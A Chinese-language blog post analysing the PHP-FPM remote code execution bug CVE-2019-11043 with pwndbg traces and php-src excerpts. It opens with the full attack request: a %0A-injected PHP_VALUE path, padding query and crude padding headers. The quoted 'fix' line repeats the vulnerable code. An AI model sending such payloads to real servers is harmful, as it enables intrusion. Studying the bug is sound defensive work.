---
title: CVE-2019-11043 PHP-FPM RCE - Vulnerability analysis 
date: 2019-12-06 11:30:33
tags: [CVE,PHP,PWN]
abstract: PHP-FPM CVE Vulnerability analysis with pwndbg.
header_image: /intro/post-bg-riverflowers.jpeg
top:
---

# The foregoing.
* 请先浏览该CVE复现与exp解析篇。
* 漏洞分析期间采用的请求包为：
```http
GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
Host: 192.168.3.68
User-Agent: Mozilla/5.0
D-Pisos: 8==========================================================================================================================D
Ebut: mamku tvoyu
```
（环境不同，`D-Pisos`也不尽相同，请不要直接引用。）
<br/>

# Brief Introduction.
CVE-2019-11043 EXP主要利用0A截断导致指针可控，通过原代码将PHP_VALUE内容精确写入指定堆，覆盖nginx&fastcgi通信时的全局变量，从而可任意控制PHP相关配置，导致RCE等威胁发生。
<br/>

# Main Analysis.
## Accpet & Read Request
要分析该cve利用过程，可以从请求被接收开始，我们只需要关注请求被接收处理后存储结果。
* 由`sapi/fpm/fpm/fpm_main.c`[line 1894](https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1894)调用`main/fastcgi.c`中[`fcgi_accept_request()`](https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/main/fastcgi.c#L1365)循环监听，接收socket请求后调用[`fcgi_read_request()`](https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/main/fastcgi.c#L1048)解析并存储整个请求`request`进全局变量`SG(server_context)`，以便适时调用。

`request`是贯穿整个利用链的变量，需要重点关注，其结构如下：
```c
pwndbg> p request
$1 = (fcgi_request *) 0x558272721d50
pwndbg> p *(struct _fcgi_request *) 0x558272721d50
$2 = {
  listen_socket = 5, 
  tcp = 0, 
  fd = -1, 
  id = 1, 
  keep = 0, 
  nodelay = 0, 
  ended = 1, 
  in_len = 0, 
  in_pad = 0, 
  out_hdr = 0x0, 
  out_pos = 0x558272721d88 "\001\006", 
  out_buf = "\001\006\000\001\000\367\001\000X-Powered-By: PHP/7.2.10\r\nSet-Cookie: PHPSESSID=vglcabn1328k2srnacn6imk1vj; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache"..., 
  reserved = '\000' <repeats 15 times>, 
  hook = {
    on_accept = 0x55826ff1c49f <fpm_request_accepting>, 
    on_read = 0x55826ff1c57d <fpm_request_reading_headers>, 
    on_close = 0x55826ff1cbac <fpm_request_finished>
  }, 
  has_env = 0, 
  env = {
    hash_table = {0x0 <repeats 128 times>}, 
    list = 0x0, 
    buckets = 0x558272725190, 
    data = 0x5582727269b0
  }
}
```
可见它是个复杂结构体，了解到此就ok。
<br/>

## Control path_info
跟进到`main`调用[`init_request_info`](https://github.com/php/php-src/blob/ab061f95ca966731b1c84cf5b7b20155c0a1c06a/sapi/fpm/fpm/fpm_main.c#L1021)，漏洞利用过程几乎全在此函数中完成。
* 首先我们将视野移到修复该cve的[commit](https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227)代码位置，即[`fpm_main.c` line1212](https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1212)附近:

```c
int ptlen = strlen(pt);
int slen = len - ptlen;
int pilen = env_path_info ? strlen(env_path_info) : 0;
int tflag = 0;
char *path_info;
if (apache_was_here) {
	/* recall that PATH_INFO won't exist */
	path_info = script_path_translated + ptlen;
	tflag = (slen != 0 && (!orig_path_info || strcmp(orig_path_info, path_info) != 0));
} else {
	path_info = env_path_info ? env_path_info + pilen - slen : NULL;
	tflag = (orig_path_info != path_info);
}
```
依次解析各行：
1. `pt`：即所请求资源的本地路径。代码往上翻阅即可得知`pt`是通过[`FCGI_GETENV(request, "PATH_TRANSLATED")`](https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1025)取出`request->env`存储的`var`为"PATH_TRANSLATED"的struct的val值（真的绕口..具体GETENV实现可自行阅读[源码](https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/main/fastcgi.c#L1689 )）,通过层层处理后成为`/var/www/html/index.php`：
```shell
pwndbg> p request.env.buckets.data[28]
$1 = {
  hash_value = 1679, 
  var_len = 15, 
  var = 0x558272727bb0 "PATH_TRANSLATED", 
  val_len = 19, 
  val = 0x558272727bc0 "/var/www/htmlB{rr\202U", 
  next = 0x0, 
  list_next = 0x5582727256b0
}
pwndbg> p pt
$2 = 0x7fca08c02000 "/var/www/html/index.php"
```
2. `len`：即`pt`处理过程的中间变量变量`script_path_translated`的strlen，其值为`/var/www/html/index.php/PHP_VALUE\nsession.auto_start=1;;;`；那么显而易见变量`slen`：即`/PHP_VALUE\nsession.auto_start=1;;;`的长度，且**攻击者可控**。
3. `env_path_info`：同1，`char *env_path_info = FCGI_GETENV(request, "PATH_INFO");`。
> 这里是漏洞关键点之一，[发现者提供的信息](https://bugs.php.net/bug.php?id=78599)来看，我们使用`%0A`这个换行符截断时，会导致"PATH_INFO"置为空值。即`env_path_info`->""，不为空，指向值为空。
```shell
pwndbg> p env_path_info
$1 = 0x558272727a02 ""
```
4. 跟进到line 1212：`path_info = env_path_info ? env_path_info + pilen - slen : NULL;`，稍微分析一下，现在`pilen`为0，`slen`可控，`env_path_info`不为空，**那么我们便可控制`path_info`指针指向任意地址**。修复commit：`path_info = env_path_info ? env_path_info + pilen - slen : NULL;`解决了该问题。
* 至此，我们操控了path_info指向特定地址，那么它到底被指向何处了呢？我们可以发现它被指向了`request->env->data->pos`指针变量的存储地址:
```shell
pwndbg> p path_info
$1 = 0x5582727279e0 "B{rr\202U"
pwndbg> telescope path_info 1
00:0000│   0x5582727279e0 —▸ 0x558272727b42 ◂— 0x4f00558272727b42
pwndbg> p request->env->data->pos
$2 = 0x558272727b42 "B{rr\202U"
pwndbg> p &request->env->data->pos
$3 = (char **) 0x5582727279e0
```
<br/>

## Control configuration
视线下移到[init_request_info() line 1222](https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1222)
```c
path_info[0] = 0;
```
* 这里，`path_info[0]`被置0，我们知道现在`path_info`是我们控制指向了`&request->env->data->pos`，那么该行执行后，`request->env->data->pos`会转而指向后两位置0地址：
```shell
# before
pwndbg> telescope request->env->data->pos 1
00:0000│   0x558272727b42 ◂— 0x4f00558272727b42
# after
pwndbg> telescope request->env->data->pos 1
00:0000│   0x558272727b00 ◂— '==========================D'
```
可见，它被“安排”到了我们添加的请求头`D_PISOS`&`HTTP_EBUT`所形成的“堆陷阱”中，接下来只要通过某步往下覆盖，便会在不影响其它正常堆值情况下添加恶意的内容。
```shell
pwndbg> x /20s 0x558272727b00-0x61
0x558272727a9f:	"8", '=' <repeats 122 times>, "D"
0x558272727b1c:	"HTTP_EBUT"
0x558272727b26:	"mamku tvoyu"
0x558272727b32:	"ORIG_PATH_INFO"
0x558272727b41:	""
0x558272727b42:	"B{rr\202U"
0x558272727b49:	"ORIG_SCRIPT_FILENAME"
0x558272727b5e:	"/var/www/html/index.php/PHP_VALUE\nsession.auto_start=0;;;"
0x558272727b98:	"/var/www/html/index.php"
0x558272727bb0:	"PATH_TRANSLATED"
0x558272727bc0:	"/var/www/htmlB{rr\202U"
0x558272727bd4:	"/PHP_VALUE\nsession.auto_start=1;;;"
0x558272727bf7:	""
0x558272727bf8:	"E"
0x558272727bfa:	"ORIG_SCRIPT_FILENAME"
0x558272727c0f:	"/var/www/html/index.php/PHP_VALUE\nsession.auto_start=1;;;"
0x558272727c49:	"/var/www/html/index.php"
0x558272727c61:	"PATH_TRANSLATED"
0x558272727c71:	"/var/www/htmlE"
0x558272727c80:	"=====D"
```
值得一提的是，`request->env->buckets->data`中各struct的`var`&`val`都是指向堆中相应位置，那么在修改相应位置值后，也相当于控制了`request->env->buckets->data`的内容：
```shell
pwndbg> p request->env->buckets->data[24]
$1 = {
  hash_value = 2025, 
  var_len = 9, 
  var = 0x558272727b1c "HTTP_EBUT", 
  val_len = 11, 
  val = 0x558272727b26 "mamku tvoyu", 
  next = 0x5582727253b0, 
  list_next = 0x5582727255f0
}
pwndbg> p request->env->buckets->data[23]
$2 = {
  hash_value = 1928, 
  var_len = 12, 
  var = 0x558272727a92 "HTTP_D_PISOS", 
  val_len = 124, 
  val = 0x558272727a9f "8", '=' <repeats 122 times>, "D", 
  next = 0x0, 
  list_next = 0x5582727255c0
}
```
* 继续跟进到[line 1226](https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1226)，内存中堆值被覆盖发生在这，我们先来看`orig_script_name`值：
```shell
pwndbg> p orig_script_name
$1 = 0x558272727124 "/index.php/PHP_VALUE\nsession.auto_start=1;;;"
```
其中包含了我们将要写的配置：`PHP_VALUE session.auto_start=1`，它会导致响应头中自动带有phpsessionid，用于验证漏洞可用。好，我们跟入`FCGI_PUTENV`，研究其实现：
```c
# main/fastcgi.h
#define FCGI_PUTENV(request, name, value) \
	fcgi_quick_putenv(request, name, sizeof(name)-1, FCGI_HASH_FUNC(name, sizeof(name)-1), value)
```
->
```c
# main/fastcgi.c
char* fcgi_quick_putenv(fcgi_request *req, char* var, int var_len, unsigned int hash_value, char* val)
{
	if (val == NULL) {
		# ...
	} else {
		return fcgi_hash_set(&req->env, hash_value, var, var_len, val, (unsigned int)strlen(val));
	}
}
```
->
```c
# main/fastcgi.c
static char* fcgi_hash_set(fcgi_hash *h, unsigned int hash_value, char *var, unsigned int var_len, char *val, unsigned int val_len)
{
	# ...
	p->var = fcgi_hash_strndup(h, var, var_len);
	p->val_len = val_len;
	p->val = fcgi_hash_strndup(h, val, val_len);
	return p->val;
}
```
->
```c
# main/fastcgi.c
static inline char* fcgi_hash_strndup(fcgi_hash *h, char *str, unsigned int str_len)
{
	char *ret;

	if (UNEXPECTED(h->data->pos + str_len + 1 >= h->data->end)) {
		# ...
	}
	ret = h->data->pos;
	memcpy(ret, str, str_len);
	ret[str_len] = 0;
	h->data->pos += str_len + 1;
	return ret;
}
```
我们终于在最后找到为什么前面要费尽千辛万苦来控制`h->data->pos`，在`fcgi_hash_strndup()`函数中会将`str`拷贝至`h->data->pos`地址，并将其移位。而现在我们的str分别是`ORIG_SCRIPT_NAME`&`/index.php/PHP_VALUE\nsession.auto_start=1;;;`，`fcgi_hash_strndup()`函数会将其依次覆盖到堆中，详见下方调试：
```shell
# before cover
pwndbg> p h->buckets->data[24]
$1 = {
  hash_value = 2025, 
  var_len = 9, 
  var = 0x558272727b1c "HTTP_EBUT", 
  val_len = 11, 
  val = 0x558272727b26 "mamku tvoyu", 
  next = 0x5582727253b0, 
  list_next = 0x5582727255f0
}

# fcgi_hash_strndup(h, var, var_len) first time
pwndbg> p str
$2 = 0x55827056174a "ORIG_SCRIPT_NAME"
pwndbg> p ret
$3 = 0x558272727b00 '=' <repeats 26 times>, "D"
pwndbg> x /1s 0x558272727b00
0x558272727b00:	'=' <repeats 26 times>, "D"
pwndbg> n
...
pwndbg> x /1s 0x558272727b00
0x558272727b00:	"ORIG_SCRIPT_NAME==========D"
pwndbg> p h->data->pos
$4 = 0x558272727b11 "=========D"

# fcgi_hash_strndup(h, var, var_len) second time
pwndbg> p str
$5 = 0x558272727124 "/index.php/PHP_VALUE\nsession.auto_start=1;;;"
pwndbg> p ret
$6 = 0x558272727b11 "=========D"
pwndbg> n
...
pwndbg> x /1s 0x558272727b11
0x558272727b11:	"/index.php/PHP_VALUE\nsession.auto_start=1;;;NFO"
pwndbg> p h->data->pos
$8 = 0x558272727b3e "FO"

# after cover
pwndbg> p h->buckets->data[24]
$9 = {
  hash_value = 2025, 
  var_len = 9, 
  var = 0x558272727b1c "PHP_VALUE\nsession.auto_start=1;;;", 
  val_len = 11, 
  val = 0x558272727b26 "session.auto_start=1;;;", 
  next = 0x5582727253b0, 
  list_next = 0x5582727255f0
}
```
可见，被巧妙重写了原`HTTP_EBUT`所在的struct，还有些细节，比如`var_len=9`，那么在该配置被取出来的时候，`var`是等于`PHP_VALUE`，而非gdb错误显示的`PHP_VALUE\nsession.auto_start=1;;;`；比如加上`ORIG_SCRIPT_NAME`长度后,`PHP_VALUE...`被精确推到`0x558272727b1c`等等。
<br/>

# Afterword.
核心漏洞分析如文中所示，当然其实还少了一部分，struct被重写后配置又是如何被实时解析成为nginx&fastcgi通信时的全局变量呢？其实堆上，比如文中`0x558272727b1c`附近的值即是全局变量存储地址，你可以通过`phpinfo()`查看配置变化。但是污染的仅仅是处理此次请求的php-fpm子进程，所以利用成功后，若服务器配置了多个worker，我们需要可能需要经过多次请求来访问到已被污染的work进程。自然的，随着堆被回收，攻击也就失效。
至于更加深入分析限于篇幅就不展开讨论，读者可以自行探索或者通过邮箱/微博跟我交流讨论。

# Reference
* [php src before commit](https://github.com/php/php-src/tree/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d)
* [patch commit](https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227)
* [土土bolg](https://lorexxar.cn/2019/10/25/php-fpm-rce/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
* [FaIth4444 blog]((http://www.rai4over.cn/2019/10/25/php-fpm-Remote-Code-Execution-%E5%88%86%E6%9E%90-CVE-2019-11043/)[from phith0n's zsxq](https://zsxq.tricking.io/topic/1011/)
